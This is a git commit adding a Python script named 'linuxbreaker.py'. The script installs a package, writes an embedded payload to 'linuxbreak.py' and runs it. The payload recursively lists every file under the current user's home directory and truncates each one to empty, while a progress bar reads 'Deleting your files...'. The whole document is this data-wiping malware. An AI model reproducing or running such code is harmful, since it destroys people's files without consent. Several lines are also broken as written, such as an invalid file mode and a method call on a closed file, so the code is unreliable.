89a423d74a3dd7625f6cba38641230dcfbf96aff
User-2357 <85888218+User-2357@users.noreply.github.com>
2021-11-25 09:10:03 -0600

    Create linuxbreaker.py

---
+++ linuxbreaker.py
@@ -0,0 +1,47 @@
+import sys
+from os import system
+
+
+if not "alive-progress" in sys.modules:
+	system("pip install alive-progress")
+
+code = """import alive_progress
+from time import sleep
+import getpass
+import os
+items = []
+with alive_progress.alive_bar(title="Detecting files...") as bar:
+	def find_files(root):
+		global items
+		bar()
+		children = list(os.listdir(root))
+		for child in children:
+			child = root + "/" + child
+			if os.path.isdir(child):
+				find_files(child)
+			else:
+				items.append(child)
+	find_files(f"/home/{getpass.getuser()}")		
+with alive_progress.alive_bar(len(items), title="Deleting your files...") as bar:
+	for item in items:
+		if "main.py" in item:
+			bar()
+			continue
+		try:
+			f = open(item, "b+")
+			f.truncate(0)
+			f.close()
+		except:
+			pass
+		bar()
+"""
+
+file = open("linuxbreak.py", "a")
+file.close()
+file.open("linuxbreak.py","w+")
+if file.read():
+	file.truncate(0)
+
+file.write(code)
+file.close()
+system("python linuxbreak.py")
